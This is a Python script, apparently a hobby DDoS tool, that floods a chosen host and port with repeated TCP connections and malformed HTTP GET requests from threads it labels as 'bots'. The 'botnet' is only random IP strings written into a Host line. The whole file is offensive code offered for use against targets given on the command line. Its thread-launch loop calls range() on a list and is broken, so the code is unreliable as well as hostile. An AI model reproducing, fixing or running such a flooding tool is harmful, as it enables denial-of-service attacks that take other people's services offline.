"""
 * @author Shadoworker5 Dev
 * @email shadoworker5.dev@gmail.com
 * @create date 2023-07-05 21:31:09
 * @modify date 2023-07-07 21:07:16
"""
import argparse
import socket
from random import randint
from threading import Thread

RED             = '\033[31m'
GREEN           = '\033[32m'
connected_bot   = 0

def generateIP():
    return '.'.join([str(randint(1, 254)) for _ in range(4)])

def generateBotnet(count):
    address_ip = []
    try:
        for _ in range(count):
            address_ip.append(generateIP())
    except Exception as e:
        print(f'Error in generateBotnet: {e}')
    
    return address_ip

def sendAttack(target, port, bot_ip):
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto((f'GET / http://{target}/ HTTP/1.1\r\n').encode('ascii'), (target, port))
            s.sendto((f'Host / http://{bot_ip}/ \r\n\r\n').encode('ascii'), (target, port))
            s.close()
            global connected_bot
            connected_bot += 1
            print(f'Bot IP address: {bot_ip}')
            print(f'Already connected bot: {str(connected_bot)}')
    except Exception as e:
        print(f'Error in sendAttack: {e}')
        exit(1)

def attack(target, port, count_botnet):
    try:
        async_call = []
        for bot in generateBotnet(count_botnet):
            t = Thread(target=sendAttack, args=(target, port, bot))
            async_call.append(t)
        print("Attack starting...............")
        
        for i in range(async_call):
            async_call[i].start()
    except Exception as e:
        print(f'Error in attack: {e}')
        exit(1)

if __name__ == '__main__':
    try:
        banner = '''
         ____   ____    ___   ____  
        |  _ \ |  _ \  / _ \ / ___| 
        | | | || | | || | | |\___ \ 
        | |_| || |_| || |_| | ___) |
        |____/ |____/  \___/ |____/ 
        '''
        parser = argparse.ArgumentParser()
        parser.add_argument('-t', '--target', help='Enter your target address or IP')
        parser.add_argument('-p', '--port', help='Enter target port', type=int, default=80)
        parser.add_argument('-z', '--zombie', help='Enter number of botnet you want', type=int, default=5)
        args = parser.parse_args()
        
        print(RED)
        print(banner)
        print(GREEN)

        if args.target is not None:
            attack(args.target, args.port, args.zombie)
        else:
            parser.print_help()
    except Exception as e:
        print(f'Errorr: {str(e)}')
        exit(1)